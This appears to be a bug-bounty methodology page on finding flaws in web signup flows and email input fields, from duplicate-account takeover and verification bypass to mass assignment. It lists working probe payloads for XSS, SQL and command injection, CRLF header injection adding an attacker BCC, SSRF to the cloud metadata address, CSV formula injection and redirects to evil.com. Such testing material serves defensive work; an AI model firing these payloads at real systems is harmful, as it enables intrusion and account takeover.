---
tags:
  - Web
---

# :material-account-plus: Registration & Signup Flaws

<span class="pill pill-medium">logic</span> <span class="pill pill-info">web</span> <span class="pill pill-easy">low-hanging</span>

Signup is the front door: the first place untrusted input reaches the database and the auth layer, and usually the oldest handler in the codebase. It's a logic-bug goldmine — duplicate accounts, unverified emails, missing rate limits, stored XSS and silent privilege writes all live here.

*Techniques and payload sets from "A Comprehensive Guide to Hunting Bugs in User Registration Features" and "The Ultimate Guide to Email Input Field Vulnerability Testing" by [coffinxp](https://medium.com/@coffinxp).*

!!! abstract "TL;DR"
    Register twice with the same identity, register with a payload instead of a name, and register without ever opening the confirmation mail. Then intercept the signup JSON and start adding fields the UI never sends — see [Mass Assignment](mass-assignment.md).

## :material-account-multiple: Duplicate registration & account overwrite

The app fails to enforce uniqueness on the identifier (email or username). Registering *over* an existing account can hand you that account, corrupt its data, or reset business-logic state.

Repro:

1. Create a legitimate account — `victim@gmail.com` / `Password123`. Log out.
2. Register again with the **exact same email** but a different password, e.g. `AttackerPass999`.
3. Log in as `victim@gmail.com` with the new password. If step 2 completed without an "email already exists" error and step 3 works, you've taken over the original account.

**Case-sensitivity variation.** Duplicate checks are often exact string matches while the database collation is case-insensitive. If `abc@gmail.com` exists, try:

```text
Abc@gmail.com
aBc@gmail.com
```

A mismatch between the check and the storage layer produces either an overwrite or a shadow duplicate account.

!!! tip "Same idea, other normalisations"
    Trailing whitespace, plus-addressing (`victim+1@gmail.com`), dot-insensitive Gmail locals (`vi.ctim@gmail.com`), and Unicode homograph variants (Punycode section below) all test the same check-vs-store gap.

## :material-alert-octagon: DoS at input fields

Signup input gets processed, hashed and stored. Very long strings force disproportionate work per request — bcrypt/argon2 over a huge password is the classic.

1. Open the signup form and fill everything normally.
2. In the **password** field (or username), submit an extremely long string — 10,000+ characters. Generate it with:

   ```bash
   python -c "print('A'*20000)"
   ```

3. Watch the response time. A long hang followed by `500 Internal Server Error` means the server struggled with the input — that's the finding.

## :material-speedometer: Missing rate limiting on signup

No per-IP or per-timeframe limit means automated bulk account creation: database flooding, mail-relay abuse for spam, ban evasion.

1. Submit the signup form through Burp and capture the `POST`.
2. Send it to **Intruder**.
3. In **Positions**, clear the auto markers and wrap the email value:

   ```text
   email=testuser§1§@example.com
   ```

4. In **Payloads**, pick *Numbers* (1–1000) or load a list of addresses, then start the attack.
5. If hundreds of consecutive requests return the success code with no CAPTCHA and no block, the endpoint has no rate limiting.

See [Rate Limiting](rate-limiting.md) for bypasses when a limit *does* exist.

## :material-language-html5: XSS in registration fields

Signup fields are a prime stored-XSS sink — the payload fires when an admin browses the user list, or when the victim's own profile renders. Test username, first/last name, display name, company, and the email field itself.

Text fields (username, name):

```html
"><img src=x onerror=alert(1)>
<svg/onload=confirm(1)>
```

Email field — loose validators often accept a quoted local part, so the payload survives:

```html
"><svg/onload=confirm(1)>"@x.y
"><svg/onload=prompt(1)>"@x.y
```

If tags are filtered, vary the casing (`<ScRiPt>`), switch event handlers (`onmouseover`, `onsubmit`), or encode the payload. Full arsenal in [XSS](xss.md).

!!! tip "Check the outbound mail too"
    The welcome/verification email renders your name as HTML in a lot of templates. A payload that's escaped on the web profile may execute in the mail client or in an admin's ticket view.

## :material-email-check: Weak or broken email verification

Verification exists to prove you own the address. Four ways it gets skipped:

=== "A. Response manipulation"

    The gate is a client-side check against the server's JSON.

    1. Intercept the **response** after signup or after clicking the verify link.
    2. Look for `"is_verified": false`, `"status": "pending"`, `"success": false`.
    3. Flip them to `true` / `"success"`.
    4. Forward to the browser and see whether the app unlocks.

=== "B. Status code manipulation"

    The client only checks the status line.

    - A protected page returns `403 Forbidden` or `302 Redirect` — intercept the response.
    - Rewrite the status to `200 OK`.
    - Strip redirect headers (`Location: /login`) as well, or the browser follows them anyway.

=== "C. Direct / forced browsing"

    Post-registration pages are hidden in the UI but not protected server-side.

    - Register, don't verify.
    - Force-browse straight to the gated routes:

    ```text
    /user/dashboard, /account/settings, /onboarding/step2.
    ```

=== "D. Verification swap (stale token reuse)"

    When the token is derived from the user ID rather than the address, the email can be swapped underneath it.

    1. Sign up with `attacker@mail.com`.
    2. Wait for the confirmation mail — **don't open the link**.
    3. If settings are reachable pre-verification, change the account email to `victim@mail.com`.
    4. A fresh link goes to `victim@mail.com` — ignore it.
    5. Open the **original** link from `attacker@mail.com`.

    If that verifies `victim@mail.com`, it's an email verification bypass via stale token reuse.

## :material-shield-alert: Weak registration implementation

- **Disposable email domains allowed** — Mailinator, TempMail and friends should be blocked; allowing them invites spam, abuse and ban evasion.
- **Signup served over HTTP** — password and PII travel in plaintext. Test by manually swapping `https://` for `http://` on the registration page and checking whether it still submits.

## :material-form-textbox-password: Weak password policy

- Accepts trivial passwords: `123456`, `password`, `qwerty`, `admin`.
- Allows the password to equal the **username**.
- Allows the password to equal the **email address**.
- Recovery material set at signup (security questions) is guessable — the reset flow inherits whatever weakness you plant here.

## :material-source-branch: Path overwrite / route collision

If profiles live on the root path (`site.com/{username}`), a username can shadow a real route.

1. Confirm the pattern — profiles resolve at `$TARGET/username`.
2. Register reserved names:
   - Modern apps: `login`, `admin`, `signup`, `api`, `dashboard`.
   - Legacy apps: `index.php`, `login.php`, `signup.php`, `admin.aspx`.
3. Browse to the collided URL (e.g. `$TARGET/login.php`). If your profile renders instead of the real page, that's a route collision — and a phishing primitive.

## :material-monitor-off: Server-side validation bypass

Length rules, allowed characters, formats and required fields enforced only in the browser disappear the moment you use a proxy.

1. Fill the signup form with anything.
2. Intercept with Burp / ZAP / a tampering extension.
3. Mutate what the frontend would have blocked:
   - empty username or email
   - password below the minimum length
   - malformed email — `test@test`, `a@b`, `abc`
   - special characters in fields that normally reject them
4. Forward it.

Registration succeeding despite broken frontend rules means the backend isn't validating — which downstream becomes malformed accounts, stored XSS, broken workflows or injection.

## :material-folder-search: Hidden / legacy registration endpoints

Older versions, admin flows and mobile APIs leave extra signup routes behind, and they usually skip validation, verification or business logic that the main one enforces.

1. Crawl/spider the app and grep the JS bundles.
2. Probe for:

   ```text
   /api/v1/register
   /auth/create
   /user/create
   /legacy/signup
   /mobile/register
   ```

3. Compare validation rules endpoint by endpoint. Any route that registers without email verification, rate limiting or password rules is the one to report.

## :material-content-duplicate: HTTP parameter pollution in signup

When duplicate parameters have undefined handling, an extra copy can override a validated value — the validator reads the first, the model writes the last (or vice versa).

1. Intercept the signup request.
2. Duplicate the parameter:

   ```text
   email=victim@gmail.com&email=attacker@gmail.com
   ```

3. Forward it.

Inconsistent handling gives you account takeover, validation bypass, or corrupted user records.

## :material-link-off: Weak or predictable verification links

1. Register legitimately and study the verification URL format.
2. Look for base64-encoded emails, short token values, or incrementing IDs.
3. Manipulate the token — decode/re-encode it, increment it, brute-force short ones.

Tokens that are guessable or not cryptographically bound to the account let you verify addresses you don't own.

## :material-translate: Punycode and IDN homograph bypass

Internationalised domains allow Unicode characters that render identically to ASCII but are distinct strings. If the app normalises emails *after* the uniqueness check, the two collapse into one account.

```text
admin@example.com          <- real
аdmin@example.com          <- Cyrillic "а"
xn--dmin-7cd@example.com   <- punycode form
```

Register (or trigger a password reset) with the Unicode variant. If the app treats it as the ASCII original after normalisation, you take over the legitimate account — a 0-click ATO. See [Account Takeover](account-takeover.md).

## :material-numeric-9-plus-box: OTP brute-force during signup

Email/SMS OTP flows regularly ship without throttling on the *verification* request (even when the *send* request is throttled).

1. Start a signup that sends an OTP.
2. Intercept the verification request.
3. Test whether you can: send unlimited attempts, guess rapidly and sequentially, or rotate IPs and keep going.
4. Look for lockout headers or messages — their absence is the finding.

Brute-forceable OTPs mean you can complete signup for any email or phone number you don't own.

## :material-cookie: Session tokens, fixation & caching

**Reusable session tokens.** Many apps mint a session at registration and keep it through verification, onboarding and first login.

1. Capture the session cookie at the start of signup.
2. Complete verification and onboarding.
3. Compare the token before and after.
4. Register several accounts without refreshing the token; try reusing one token across accounts or devices.

**Session fixation.** Same test, framed as an attack: if the session ID never rotates, an attacker can plant a known session in the victim's browser and access the account they then create.

**Cache control.** Signup and verification pages get cached where they shouldn't.

- Complete signup or verification, then use the back button or offline mode.
- Inspect cached pages; test private browsing and shared-device scenarios.

OTP screens, tokens or verification-status pages served from cache are a real finding on shared machines.

## :material-code-braces: Null byte injection in signup inputs

Where validation runs before truncation and storage runs after, `%00` splits the two views apart.

```text
attacker@mail.com%00victim@mail.com
username%00.jpg
```

Register with these, watch how the value is stored and displayed, then try logging in or verifying. Truncation at the null byte lets you override account attributes or skip checks entirely.

## :material-account-check: Missing email confirmation enforcement

Signup succeeds and the account is fully usable without ever proving ownership of the address.

1. Register with a random email you don't control.
2. Skip the confirmation link entirely.
3. Log in directly.
4. Try privileged actions — profile update, password reset, invites.

If the app treats the account as active, you can impersonate arbitrary addresses (and squat on `@corporate-domain.com` ones).

## :material-identifier: Cross-account IDOR after signup

Onboarding endpoints are written fast and rarely get access-control review.

1. Create two fresh accounts, **A** and **B**.
2. While both are mid-signup/onboarding, capture the API calls each makes.
3. Swap A's IDs or emails for B's.
4. Try viewing and updating each other's onboarding steps.

Any cross-read or cross-write is an [IDOR](idor.md).

## :material-form-textbox: Mass assignment in JSON signup flows

JSON registration APIs bind request fields straight onto the user model. Adding `role`, `isAdmin`, `email_verified`, `organization_id` or `plan` to the body is the single highest-value test on this page.

```json
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "isAdmin": true,
  "password":"Password1!"
}
```

The full payload library — casing/type variants, role strings, tenant fields, nested and dot-notation keys, NoSQL operators, billing and workflow-state fields — is on its own page: **[Mass Assignment](mass-assignment.md)**.

## :material-at: Email input field testing

The email field is its own attack surface: it's reflected in HTML, in JavaScript, in outbound mail headers, in SQL, and sometimes in shell commands and outbound HTTP requests.

### Format validation (RFC822)

Start by mapping what the validator actually accepts against what RFC822 says. The gap between the two is where every payload below fits.

| Email Address | Expected (RFC822) | Notes |
| --- | --- | --- |
| `simple@example.com` | Valid | Standard format |
| `very.common@example.com` | Valid | Dots in local part |
| `disposable.style.email.with+symbol@example.com` | Valid | Plus symbol in local part |
| `user@[192.168.1.1]` | Valid | Address literal (rare, valid) |
| `"much.more unusual"@example.com` | Valid | Quoted local part |
| `admin@mailserver1` | Valid | Local domain name (no TLD) |
| `plainaddress` | Invalid | Missing @ and domain |
| `@missinglocal.org` | Invalid | Missing local part |
| `username@.com` | Invalid | Leading dot in domain |
| `username@-example.com` | Invalid | Leading hyphen in domain |
| `username@example..com` | Invalid | Double dot in domain |
| `username@exam_ple.com` | Invalid | Underscore in domain |
| `test@examp℮.com` | Invalid | Unicode character in domain |

An app that **rejects** valid forms is merely annoying; one that **accepts** the invalid forms is parsing loosely enough to accept payloads too.

### RFC822 validator script

coffinxp's [RFC822-Email-Validator](https://github.com/coffinxp/RFC822-Email-Validator) — check any address against the standard before deciding whether the target's behaviour is a bug:

```python
import re
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# RFC822-compliant regex (simplified for practical use)
RFC822_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*"
    r'|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")'
    r"@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*)$"
)

def is_rfc822_valid(email):
    return bool(RFC822_REGEX.match(email))

if __name__ == "__main__":
    email = input("Enter email address: ").strip()
    if is_rfc822_valid(email):
        print(f"RFC822 valid: {Fore.GREEN}YES{Style.RESET_ALL}")
    else:
        print(f"RFC822 valid: {Fore.RED}NO{Style.RESET_ALL}")
```

```bash
python rfc822_email_validator.py
# enter the address at the prompt -> "RFC822 valid: YES" / "RFC822 valid: NO"
```

### XSS via the email field

Submit the payload as the email, then hunt for the reflection — HTML body, an attribute, a JS string, or the outbound email template.

```html
"><script>alert(1)</script>@test.com
"><svg/onload=alert(3)>@test.com
"><svg/onload=confirm(1337)>"@x.y
```

### SSRF via the email field

Apps validate addresses by touching the network: MX lookups, domain reachability checks, Gravatar-style avatar fetches. Point that at yourself or at internal space and watch [Burp](../toolbox/burp.md) Collaborator.

```text
test@your-burpcollaborator.net
test@requestbin.net
test@127.0.0.1
test@localhost
test@169.254.169.254
```

`169.254.169.254` is the cloud metadata endpoint — details in [SSRF](ssrf.md).

### Email header injection

When the address is dropped into a mail header unescaped, CRLF sequences let you add headers or terminate them and write a body. Register or trigger a reset, then read the **raw** headers of what arrives.

```text
test@example.com%0d%0aBCC:attacker@example.com
test@example.com\r\nBCC:attacker@example.com
test@example.com%0aCC:attacker@example.com
test@example.com\r\nContent-Type:text/html\r\n\r\n<b>Injected</b>
```

### SQL injection

The address usually reaches a `WHERE` clause on the very next line. Watch for errors, timing changes and behavioural differences.

```text
test' OR '1'='1@example.com
test" OR "1"="1@example.com
test@example.com'--
test@example.com") OR 1=1--
```

More in [SQL Injection](sqli.md).

### Command injection

Some stacks shell out for mail delivery or DNS checks with the address interpolated in.

```text
test@example.com; whoami
test@example.com && id
test@example.com | uname -a
test@example.com`id`
```

More in [Command Injection](command-injection.md).

### Open redirect

Confirmation links are built from the address in some flows — try to steer where the click lands.

```text
test@example.com%0d%0aLocation:https://evil.com
test@example.com/?next=https://evil.com
```

### IDOR / user enumeration

Submit known and guessed addresses to registration, password reset and "check availability" endpoints, then diff the responses — body text, status code, **and** response time.

```text
admin@example.com
user@example.com
test@example.com
```

### Format / validation bypass

Technically-odd-but-accepted formats reveal a permissive parser, and the nested-address form is what makes routing confusion possible.

```text
"test@evil.com"@example.com
test@subdomain..com
test@-example.com
test@.com
test@exam_ple.com
test@examp℮.com
```

### CRLF injection

Beyond mail headers, the address may land in an HTTP response header.

```text
test@example.com%0d%0aInjected-Header: injected
test@example.com%0aInjected-Header: injected
```

More in [CRLF Injection](crlf.md).

### Business logic abuse

- Register the same address repeatedly and compare outcomes.
- Change your account email to another user's address and see whether the change is verified before it takes effect.
- Intercept and modify requests mid-verification (see the verification bypasses above).

### Unicode and homograph attacks

Visually identical, byte-distinct addresses bypass uniqueness checks and make convincing phishing.

```text
test@exаmple.com   (Cyrillic "a")
test@examp℮.com
```

### Injection into downstream systems

The address is stored, then re-emitted into logs, CSV exports, dashboards and third-party integrations that never sanitise it.

```text
=cmd|' /C calc'!A0
"=HYPERLINK(\"http://evil.com\")"
test@example.com\nInjectedLogEntry
```

Register with these, then request a data export or check any log view you can reach. Formula injection in an exported CSV is a real finding when staff open the export.

### Rate limiting & enumeration

Automate reset/registration attempts across an address list and diff the responses — differing messages, status codes or timings enumerate valid users. Details in [Rate Limiting](rate-limiting.md).

## :material-link-variant: Related

- The highest-value test on a JSON signup API: [Mass Assignment](mass-assignment.md).
- Verification and reset bypasses chain straight into [Account Takeover](account-takeover.md) and [Auth Bypass](auth-bypass.md).
- Payload depth: [XSS](xss.md), [SSRF](ssrf.md), [CRLF Injection](crlf.md), [SQL Injection](sqli.md).
- No limits on signup/OTP? [Rate Limiting](rate-limiting.md).
- Reference: [OWASP Web Security Testing Guide — Identity Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README).
